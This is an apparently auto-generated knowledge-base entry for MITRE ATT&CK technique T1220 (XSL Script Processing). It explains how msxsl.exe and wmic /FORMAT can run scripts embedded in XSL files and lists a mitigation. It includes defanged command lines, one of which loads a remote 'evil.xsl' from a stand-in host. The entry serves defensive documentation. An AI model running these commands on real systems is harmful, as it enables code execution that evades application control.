---
generated_by: focuslocust
source: mitre
type: technique
aliases:
    - T1220
tags:
    - attack/domain/enterprise_attack
    - attack/has_procedures
    - attack/mitigated
    - attack/tactic/stealth
    - attack/type/technique
    - platform/windows
mitre-attack: kb/mitre/attack/techniques/T1220-xsl-script-processing
tactic:
    - Stealth
platforms:
    - Windows
permissions required:
    - none
---

## Description

Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. [^6] <br><br>Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [[kb/mitre/attack/techniques/T1127-trusted-developer-utilities-proxy-execution|Trusted Developer Utilities Proxy Execution]], the Microsoft common line transformation utility binary (msxsl.exe) [^3]  can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. [^4]  Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. [^1]  Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.[^5] <br><br>Command-line examples:[^4] [^5] <br><br>* `msxsl.exe customers[.]xml script[.]xsl`<br>* `msxsl.exe script[.]xsl script[.]xsl`<br>* `msxsl.exe script[.]jpeg script[.]jpeg`<br><br>Another variation of this technique, dubbed “Squiblytwo”, involves using [[kb/mitre/attack/techniques/T1047-windows-management-instrumentation|Windows Management Instrumentation]] to invoke JScript or VBScript within an XSL file.[^2]  This technique can also execute local/remote scripts and, similar to its [[kb/mitre/attack/techniques/T1218.010-regsvr32|Regsvr32]]/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [[kb/mitre/attack/techniques/T1047-windows-management-instrumentation|Windows Management Instrumentation]] provided they utilize the /FORMAT switch.[^5] <br><br>Command-line examples:[^5] [^2] <br><br>* Local File: `wmic process list /FORMAT:evil[.]xsl`<br>* Remote File: `wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”`

## Procedure Examples
| ID | Name | Use |
| --- | --- | --- |
| [S0373](https://attack.mitre.org/software/S0373) | Astaroth | Astaroth executes embedded JScript or VBScript in an XSL stylesheet located on a remote domain. [^1]  |

## Mitigations
| ID | Name | Description |
| --- | --- | --- |
| [[kb/mitre/attack/mitigations/M1038-execution-prevention\|M1038]] | Execution Prevention | If msxsl.exe is unnecessary, then block its execution to prevent abuse by adversaries. |

 [^1]: [Reaqta MSXSL Spearphishing MAR 2018](https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/)
 [^2]: [LOLBAS Wmic](https://lolbas-project.github.io/lolbas/Binaries/Wmic/)
 [^3]: [Microsoft msxsl.exe](https://web.archive.org/web/20190508171106/https://www.microsoft.com/en-us/download/details.aspx?id=21714)
 [^4]: [Penetration Testing Lab MSXSL July 2017](https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/)
 [^5]: [XSL Bypass Mar 2019](https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75)
 [^6]: [Microsoft XSLT Script Mar 2017](https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script)
 [^7]: [Cybereason Astaroth Feb 2019](https://www.cybereason.com/blog/information-stealing-malware-targeting-brazil-full-research)
